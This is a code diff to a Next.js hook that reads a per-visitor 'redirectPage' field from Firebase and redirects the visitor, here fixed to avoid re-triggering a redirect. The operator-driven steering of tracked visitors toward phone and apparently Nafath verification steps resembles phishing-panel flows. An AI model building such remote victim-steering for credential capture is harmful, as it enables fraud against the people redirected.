@@ -3,9 +3,9 @@
  * Checks Firebase for redirectPage field and navigates accordingly
  */
 
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
-import { checkRedirectPage, clearRedirectPage } from "@/lib/visitor-tracking";
+import { checkRedirectPage, clearRedirectPage, clearRedirectPageImmediate } from "@/lib/visitor-tracking";
 import { db } from "@/lib/firebase";
 import { doc, onSnapshot, Firestore } from "firebase/firestore";
 
@@ -19,6 +19,8 @@ export function useRedirectMonitor({
   currentPage,
 }: UseRedirectMonitorProps) {
   const router = useRouter();
+  // ✅ FIX: Track the last processed redirect to prevent re-triggering
+  const redirectProcessedRef = useRef<string | null>(null);
 
   useEffect(() => {
     if (!visitorId || !db) return;
@@ -33,13 +35,21 @@ export function useRedirectMonitor({
           const currentStep = data.currentStep;
 
           // Modern system: Check redirectPage field
-          if (redirectPage && redirectPage !== currentPage) {
+          // ✅ FIX: Only redirect if it's a NEW redirect (not already processed)
+          if (
+            redirectPage &&
+            redirectPage !== currentPage &&
+            redirectPage !== redirectProcessedRef.current
+          ) {
+            // Mark this redirect as processed
+            redirectProcessedRef.current = redirectPage;
+
             console.log(
               `[useRedirectMonitor] Redirecting from ${currentPage} to ${redirectPage}`
             );
 
-            // Clear the redirect flag
-            await clearRedirectPage(visitorId);
+            // ✅ FIX: Clear the redirect flag IMMEDIATELY to prevent race condition
+            await clearRedirectPageImmediate(visitorId);
 
             // Navigate to the requested page
             const pageMap: Record<string, string> = {
@@ -57,6 +67,11 @@ export function useRedirectMonitor({
 
             const targetUrl = pageMap[redirectPage] || "/";
             router.push(targetUrl);
+          }
+
+          // ✅ FIX: Reset processed redirect when redirectPage is cleared
+          else if (!redirectPage && redirectProcessedRef.current) {
+            redirectProcessedRef.current = null;
           }
 
           // Legacy system: Check currentStep field for phone and nafad
